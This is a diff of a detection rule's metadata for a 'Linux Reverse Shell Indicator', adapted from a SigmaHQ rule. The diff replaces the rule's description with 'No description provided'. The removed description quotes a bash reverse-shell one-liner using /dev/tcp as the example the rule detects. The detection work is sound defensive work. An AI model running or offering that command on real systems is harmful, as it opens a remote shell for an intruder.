@@ -1,6 +1,6 @@
 id: a12b6a41-8184-599a-8fd4-6edda9427b69
 name: Linux Reverse Shell Indicator
-description: 'Detects a bash contecting to a remote IP address (often found when actors do something like ''bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'') Reference: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml | Source: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml'
+description: No description provided
 severity: High
 queryFrequency: PT1H
 queryPeriod: PT1H
